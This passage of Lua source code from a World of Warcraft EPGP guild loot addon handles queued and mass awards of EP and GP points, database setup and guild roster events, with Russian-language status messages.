  Debug("guild_info:\n%s", guild_info)
  SetGuildInfoText(guild_info)
  GuildRoster()
end

function EPGP:GetMain(name)
  return main_data[name] or name
end

local massEPFrame = CreateFrame("Frame")
local massEPJob
local massEPQueue = {}
local massEPElapsed = 0
massEPFrame:Hide()
EPWorkBusy = function()
  return massEPJob ~= nil or #massEPQueue > 0
end

local function CompleteMassEPJob(job)
  massEPJob = nil
  if job.kind == "mass" and (next(job.awarded) or next(job.extras_awarded)) then
    if next(job.extras_awarded) then
      callbacks:Fire("MassEPAward", job.awarded, job.reason, job.amount,
                     job.extras_awarded, job.extras_reason, job.extras_amount)
    else
      callbacks:Fire("MassEPAward", job.awarded, job.reason, job.amount)
    end
  end
  if #massEPQueue == 0 then
    massEPFrame:Hide()
  end
end

local function QueueEPWork(job)
  if #massEPQueue >= 50 then
    EPGP:Print("Очередь начислений EP заполнена (50 операций).")
    return false
  end
  table.insert(massEPQueue, job)
  massEPFrame:Show()
  return true
end

function EPGP:QueueEPBy(name, reason, amount)
  if type(name) ~= "string" or name == "" then
    self:Print("Не выбрана цель для изменения EP.")
    return false
  end
  if type(reason) ~= "string" or reason == "" or type(amount) ~= "number" or
     amount ~= math.floor(amount + 0.5) or amount == 0 or
     amount < -99999 or amount > 99999 then
    return false
  end
  if not IsInGuild() or not CanEditOfficerNote() then
    self:Print("Нет доступа к изменению EP.")
    return false
  end
  if GS:IsCurrentState() and not self:GetEPGP(name) then
    self:Print("Нет данных EPGP для " .. name)
    return false
  end
  return QueueEPWork({kind = "single", name = name, reason = reason,
                      amount = amount, created = GetTime()})
end

massEPFrame:SetScript("OnUpdate", function(self, elapsed)
  massEPElapsed = massEPElapsed + elapsed
  if massEPElapsed < 0.2 then return end
  massEPElapsed = 0
  if not massEPJob then
    massEPJob = table.remove(massEPQueue, 1)
    if not massEPJob then self:Hide() return end
  end
  local job = massEPJob
  if not IsInGuild() or not CanEditOfficerNote() then
    EPGP:Print("Очередь EP остановлена: нет доступа к заметкам гильдии.")
    massEPJob = nil
    wipe(massEPQueue)
    self:Hide()
    return
  end
  if not GS:IsCurrentState() then
    if job.kind == "single" and GetTime() - job.created > 60 then
      EPGP:Print("Списание EP не выполнено за 60 секунд: " .. job.name)
      CompleteMassEPJob(job)
    end
    return
  end
  if job.kind == "single" then
    if not EPGP:CanIncEPBy(job.reason, job.amount) then
      CompleteMassEPJob(job)
      return
    end
    EPWorkProcessing = true
    local ok, result = pcall(EPGP.IncEPBy, EPGP, job.name, job.reason, job.amount)
    EPWorkProcessing = false
    if not ok then
      EPGP:Print("Ошибка изменения EP для " .. job.name .. ": " .. tostring(result))
    end
    CompleteMassEPJob(job)
    return
  end
  local entry = job.entries[job.index]
  if not entry then
    CompleteMassEPJob(job)
    return
  end
  job.index = job.index + 1
  local ok, recipient = pcall(EPGP.IncEPBy, EPGP, entry.name, entry.reason, entry.amount, true)
  if ok then
    if recipient then
      if entry.extras then
        job.extras_awarded[recipient] = true
      else
        job.awarded[recipient] = true
      end
    end
  else
    EPGP:Print("Ошибка массового начисления EP для " .. entry.name .. ": " .. tostring(recipient))
  end
  if job.index > #job.entries then
    CompleteMassEPJob(job)
  end
end)

function EPGP:CanQueueMassEP(reason, amount)
  return not not (self:CanMassAwardEP() and IsInGuild() and CanEditOfficerNote() and
         type(reason) == "string" and #reason > 0 and type(amount) == "number" and
         amount == math.floor(amount + 0.5) and amount ~= 0 and
         amount >= -99999 and amount <= 99999 and #massEPQueue < 50)
end

function EPGP:IncMassEPBy(reason, amount)
  if not self:CanQueueMassEP(reason, amount) then
    return false
  end
  local extras_amount = math.floor(global_config.extras_p * 0.01 * amount)
  local extras_reason = "Замена: " .. reason
  local extras_mains = {}
  local processed = {}
  local entries = {}

  for name, is_selected in pairs(selected) do
    if is_selected and name ~= "_count" then
      local ep, gp, main = EPGP:GetEPGP(name)
      if ep then
        extras_mains[main or name] = true
      end
    end
  end

  for i=1,EPGP:GetNumMembers() do
    local name = EPGP:GetMember(i)
    if EPGP:IsMemberInAwardList(name) or
       (not UnitInRaid("player") and GetNumPartyMembers() > 0 and
        (name == UnitName("player") or UnitInParty(name))) then
      -- EPGP:GetMain() will return the input name if it doesn't find a main,
      -- so we can't use it to validate that this actually is a character who
      -- can recieve EP.
      --
      -- EPGP:GetEPGP() returns nil for ep and gp, if it can't find a
      -- valid member based on the name however.
      local ep, gp, main = EPGP:GetEPGP(name)
      local member = main or name
      if ep and not processed[member] then
        processed[member] = true
        if extras_mains[member] then
          if extras_amount ~= 0 then
            table.insert(entries, {name = name, member = member, reason = extras_reason, amount = extras_amount, extras = true})
          end
        else
          table.insert(entries, {name = name, member = member, reason = reason, amount = amount})
        end
      end
    end
  end

  if #entries == 0 then return true end
  local job = {
    kind = "mass",
    entries = entries,
    index = 1,
    awarded = {},
    extras_awarded = {},
    amount = amount,
    reason = reason,
    extras_amount = extras_amount,
    extras_reason = extras_reason,
  }
  if not QueueEPWork(job) then return false end
  local announced = {}
  local extras_announced = {}
  for i = 1, #entries do
    local entry = entries[i]
    if entry.extras then
      extras_announced[entry.member] = true
    else
      announced[entry.member] = true
    end
  end
  callbacks:Fire("MassEPStart", announced, reason, amount,
                 extras_announced, extras_reason, extras_amount)
  return true
end

function EPGP:IncMassGPBy(reason, amount)
  local awarded = {}
  local extras_awarded = {}
  local extras_amount = 0
  local extras_reason = reason .. " - " .. L["Standby"]

  for i=1,EPGP:GetNumMembers() do
    local name = EPGP:GetMember(i)
    if EPGP:IsMemberInAwardList(name) then
      -- EPGP:GetMain() will return the input name if it doesn't find a main,
      -- so we can't use it to validate that this actually is a character who
      -- can recieve EP.
      --
      -- EPGP:GetEPGP() returns nil for ep and gp, if it can't find a
      -- valid member based on the name however.
      local ep, gp, main = EPGP:GetEPGP(name)
      local main = main or name
      if gp and not awarded[main] and not extras_awarded[main] then
        -- if EPGP:IsMemberInExtrasList(name) then
        --   extras_awarded[EPGP:IncGPBy(name, extras_reason,
        --                               extras_amount, true)] = true
        -- else
          awarded[EPGP:IncGPBy(name, reason, amount, true)] = true
        -- end
      end
    end
  end
  if next(awarded) then
    if next(extras_awarded) then
      callbacks:Fire("MassGPAward", awarded, reason, amount,
                     extras_awarded, extras_reason, extras_amount)
    else
      callbacks:Fire("MassGPAward", awarded, reason, amount)
    end
  end
end





function EPGP:ReportErrors(outputFunc)
  for name, note in pairs(ignored) do
    outputFunc(L["Invalid officer note [%s] for %s (ignored)"]:format(
                 note, name))
  end
end

function EPGP:OnInitialize()
  -- Setup the DB. The DB will NOT be ready until after OnEnable is
  -- called on EPGP. We do not call OnEnable on modules until after
  -- the DB is ready to use.
  db = LibStub("AceDB-3.0"):New("EPGP_DB")

  local defaults = {
    profile = {
      last_awards = {},
      show_everyone = false,
      sort_order = "PR",
      recurring_ep_period_mins = 15,
    }
  }
  db:RegisterDefaults(defaults)
  for name, module in self:IterateModules() do
    -- Each module gets its own namespace. If a module needs to set
    -- defaults, module.dbDefaults needs to be a table with
    -- defaults. Otherwise we initialize it to be enabled by default.
    if not module.dbDefaults then
      module.dbDefaults = {
        profile = {
          enabled = true
        }
      }
    end
    module.db = db:RegisterNamespace(name, module.dbDefaults)
  end
  -- After the database objects are created, we setup the
  -- options. Each module can inject its own options by defining:
  --
  -- * module.optionsName: The name of the options group for this module
  -- * module.optionsDesc: The description for this options group [short]
  -- * module.optionsArgs: The definition of this option group
  --
  -- In addition to the above EPGP will add an Enable checkbox for
  -- this module. It is also guaranteed that the name of the node this
  -- group will be in, is the same as the name of the module. This
  -- means you can get the name of the module from the info table
  -- passed to the callback functions by doing info[#info-1].
  --
  self:SetupOptions()

  -- New version note.
  if db.global.last_version ~= EPGP.version then
    db.global.last_version = EPGP.version
    StaticPopup_Show("EPGP_NEW_VERSION")
  end
end

function EPGP:RAID_ROSTER_UPDATE()
  -- If we are in a raid, make sure no member of the raid is
  -- selected
  -- If we are not in a raid, this means we just left so remove
  -- everyone from the selected list.
  -- We also need to stop any recurring EP since they should stop
  -- once a raid stops.
  if not UnitInRaid("player") and self:RunningRecurringEP() then
    self:StopRecurringEP()
  end
  DestroyStandings()
end

function EPGP:GUILD_ROSTER_UPDATE()
  if not IsInGuild() then
    for name, module in EPGP:IterateModules() do
      module:Disable()
    end
  else
    local guild = GetGuildInfo("player") or ""
    if #guild == 0 then
      GuildRoster()
    else
      if db:GetCurrentProfile() ~= guild then
        Debug("Setting DB profile to: %s", guild)
        db:SetProfile(guild)
      end
      StandbyLoad()
      -- This means we didn't initialize the db yet.
      if not EPGP.db then
        EPGP.db = db

        -- Enable all modules that are supposed to be enabled
        for name, module in EPGP:IterateModules() do
          if module.db.profile.enabled or not module.dbDefaults then
            Debug("Enabling module (startup): %s", name)
            module:Enable()
          end
        end
        -- Check if we have a recurring award we can resume
        if EPGP:CanResumeRecurringEP() then
          EPGP:ResumeRecurringEP()
        else
          EPGP:CancelRecurringEP()
        end
      end
    end
  end
end

function EPGP:OnEnable()
  GS.RegisterCallback(self, "GuildInfoChanged", ParseGuildInfo)
  GS.RegisterCallback(self, "GuildNoteChanged", ParseGuildNote)
  GS.RegisterCallback(self, "GuildNoteDeleted", HandleDeletedGuildNote)

  EPGP.RegisterCallback(self, "BaseGPChanged", DestroyStandings)

  self:RegisterEvent("RAID_ROSTER_UPDATE")
  self:RegisterEvent("GUILD_ROSTER_UPDATE")
  self:RegisterEvent("CHAT_MSG_ADDON", "StandbyCHAT_MSG_ADDON")
  if type(RegisterAddonMessagePrefix) == "function" then
    RegisterAddonMessagePrefix(standbyPrefix)
  end

  GuildRoster()
end
